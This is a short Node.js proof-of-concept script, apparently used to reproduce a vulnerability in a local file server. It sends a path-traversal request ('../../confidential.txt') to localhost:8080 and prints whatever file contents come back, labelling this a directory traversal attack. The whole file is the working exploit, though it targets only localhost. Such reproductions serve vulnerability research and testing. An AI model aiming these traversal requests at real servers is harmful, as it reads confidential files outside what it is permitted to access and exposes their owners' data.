/**
 * Author: Liang Gong
 * (colors dep removed)
 */
(function() {
    var http = require('http');
    var content;
    var url = 'http://localhost:8080/../../confidential.txt';

    console.log('\t[directory traversal attack]: ' + url);

    var content = '';

    http.get(url, (res) => {
        res.on('data', (chunk) => {
            content += chunk.toString('utf-8');
        });
        res.on('end', () => {
            console.log('\t[directory traversal request response]: ' + content.toString('utf-8'));
        });
    });
})();